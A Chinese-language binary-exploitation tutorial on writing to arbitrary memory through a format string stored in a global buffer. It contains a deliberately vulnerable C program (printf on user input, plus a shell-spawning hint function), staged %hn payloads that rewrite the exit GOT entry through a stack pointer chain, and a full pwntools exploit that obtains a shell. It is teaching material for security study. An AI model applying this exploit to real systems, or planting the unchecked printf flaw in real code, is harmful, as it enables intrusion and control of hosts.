---
title: "全局格式化字符串任意写"
description: ""
lead: ""
date: 2023-04-21T22:46:04+08:00
lastmod: 2023-04-21T22:46:04+08:00
draft: false
images: []
menu:
  docs:
    parent: ""
    identifier: "全局格式化字符串任意写-1a5f19175bd89fd601a2a202f89f16d9"
weight: 101
toc: true
---

## 0x01 介绍

之前的情况是格式化字符串保存在栈中，所以我们可以很容易控制栈的内容，往栈中写入地址等数据，但是如果格式化字符串是保存在bss、data段，那么我们就不能再通过之前的方式来实现任意写。之前任意写能实现就是因为在栈中有我们写入的地址，而现在我们不能对栈写入地址了。

我们来仔细观察栈中的数据

![3753dc6a988ba32dbfbbcb0840407f96](images/3753dc6a988ba32dbfbbcb0840407f96.png)  

可以发现栈中保存了很多栈地址，如果我们可以通过任意写往这些栈地址指向的地方写入我们要攻击的地址，然后栈中就会出现被攻击的地址，最后我们再往被攻击的地址写入指定数据即可获取shell等操作

![a1422bbe755576c841fdbca25c811d2a](images/a1422bbe755576c841fdbca25c811d2a.png)  

我们以一个例子来看

```cpp
#include<stdio.h>
#include<stdlib.h>
char buf[0x50];
void hint() { system("/bin/sh"); }
int main() {
    int choice;
    setbuf(stdout, 0);
    while(1) {
        scanf("%d", &choice);
        if(choice == 1) {
            scanf("%s", buf);
            printf(buf);
        } else {
            exit(0);
        }
    }
}
// gcc global_printf.c -m32 -o global_printf_x32 -no-pie
```

![28e05b489aa2c7daecd16a9286386daa](images/28e05b489aa2c7daecd16a9286386daa.png)  

虽然原理按照之前的来将很简单，但是我们不能选简单的栈地址，而应该选栈链形式的地址，我们在之前讲任意写的时候是通过两次写入才完成的，因为我们不可以一次性写入很大的值，所以我们其实是需要中间有个地址过度，这个地址过度的目的是为了可以分两次来写入attack addr。我们可以控制过度地址的末尾的字节来修改stack addr的位置，从而达到分段写的目的。

![bad0b207975deb1df3908fce2daf2cf7](images/bad0b207975deb1df3908fce2daf2cf7.png)  

我们以这个例子来具体讲操作。首先通过 `0xffffd654` 修改 `0xffffd783` 的后两个字节为离当前栈顶近的位置，再覆写之前需要先泄露一个地址，然后通过计算相对偏移量来获取设置后两个字节应该覆盖的地址，比如我们可以泄露图中第九个栈单元的 `0xffffd5c0` ，而我们要写入的地址为 `0xffffd5a8` ，泄露出来的地址和我们要写入地址之间的偏移量为0x18，payload就可以写为

```python
stack = leak_addr - 0x18    # leak_addr为泄露出来的栈地址
payload = ("%{0}d%5$hn".format(stack & 0xffff)).encode()
```

![23dade76140123bed42530fe7eb6cff0](images/23dade76140123bed42530fe7eb6cff0.png)  

可以发现已经修改成功，接着我们注入exit的got表的低2位， `0xffa792b4` 的偏移量为53

```python
payload = ("%{0}d%53$hn".format(exit_got & 0xffff)).encode()
```

![5abfb2523bbfa40ecffc047259c3982d](images/5abfb2523bbfa40ecffc047259c3982d.png)  

低字节已经覆盖成功了，接下来修改stack2 addr为stack2 addr+2

```python
payload = ("%{0}d%5$hn".format((stack & 0xffff) + 2)).encode()
```

![6cc7fea685db9db852948b9bbf8a3b38](images/6cc7fea685db9db852948b9bbf8a3b38.png)  

最后再次注入exit的got高地址

```python
payload = ("%{0}d%53$hn".format((exit_got >> 16) & 0xffff)).encode()
```

![879893efd8d587a59e3347a86fc931e6](images/879893efd8d587a59e3347a86fc931e6.png)  

这时候完整的exit的got表就写入成功了，而hint地址为

![e1f8aec2d996559b76dd836d92c2a310](images/e1f8aec2d996559b76dd836d92c2a310.png)  

和exit的got表内存储的地址 `0x80483e6` 只有后两个字节不一样，所以只要覆盖低两位几个，这里偏移量为10

```python
payload = ("%{0}d%10$hn".format(hint & 0xffff)).encode()
```

![b5903823ee61b510e45d0d7f968ce0c3](images/b5903823ee61b510e45d0d7f968ce0c3.png)  

最后就修改成功了，只要退出触发exit函数即可获取shell

![b45487c53fb75eea5c1c737acdc1520a](images/b45487c53fb75eea5c1c737acdc1520a.png)  

完整的Exploit为

```python
from pwn import*
o = process("./global_printf_x32")
elf = ELF("./global_printf_x32")
exit_got = elf.got['exit']
hint = elf.sym['hint']
o.sendline(b"1")
o.sendline(b"%9$p")
leak_addr = int(o.recv(), 16)
log.info(hex(leak_addr))
stack = leak_addr - 0x18
o.sendline(b"1")
payload = ("%{0}d%5$hn".format(stack & 0xffff)).encode()
o.sendline(payload)
o.sendline(b"1")
payload = ("%{0}d%53$hn".format(exit_got & 0xffff)).encode()
o.sendline(payload)
o.sendline(b"1")
payload = ("%{0}d%5$hn".format((stack & 0xffff) + 2)).encode()
o.sendline(payload)
o.sendline(b"1")
payload = ("%{0}d%53$hn".format((exit_got >> 16) & 0xffff)).encode()
o.sendline(payload)
o.sendline(b"1")
payload = ("%{0}d%10$hn".format(hint & 0xffff)).encode()
o.sendline(payload)
o.interactive()
```

其他的同理，我们还可以通过这种方法来覆盖函数返回地址等东西
